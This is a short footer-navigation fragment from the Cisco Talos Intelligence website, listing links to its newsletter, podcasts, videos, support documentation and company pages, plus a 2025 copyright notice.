  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* + ###### Support
  + [Support Documentation](https://support.talosintelligence.com)
* + ###### Company
  + [About Talos](/about)
  + [Careers](/careers)
  + [Cisco Security](https://www.cisco.com/c/en/us/products/security/product-listing.html)

###### Follow us

[![Cisco](/assets/logo_cisco_white-d87b7f7d3152ad412e48aad924a972cc5b802b7a53cb56b0792a4456c9b7b3a5.svg)](http://tools.cisco.com/security/center/home.x)

©
2025
Cisco Systems, Inc. and/or its affiliates. All rights
reserved. View our
[Privacy Policy.](http://www.cisco.com/web/siteassets/legal/privacy_full.html)


